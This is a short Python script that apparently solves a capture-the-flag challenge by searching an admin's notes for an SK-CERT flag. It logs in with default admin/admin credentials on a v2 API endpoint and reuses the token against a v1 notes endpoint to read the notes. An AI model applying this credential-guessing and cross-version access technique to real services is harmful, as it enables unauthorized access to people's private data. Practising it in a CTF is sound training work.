# Wow, the admin has LOTS of notes!
# Let's search them for SK-CERT
import requests
import json

url = "http://exp.cybergame.sk:7021/api/v2/login"
r = requests.post(url, json={"username": "admin", "password": "admin"})
token = r.json().get("token")
r2 = requests.get("http://exp.cybergame.sk:7021/api/v1/notes", headers={"Authorization": f"Bearer {token}"})

data = r2.json()
for note in data.get("notes", []):
    if "SK-CERT" in note.get("title", "") or "SK-CERT" in note.get("content", ""):
        print("FOUND FLAG!")
        print(note)
    elif "flag" in note.get("title", "").lower() or "flag" in note.get("content", "").lower():
        print("FOUND FLAG RELATED NOTE!")
        print(note)
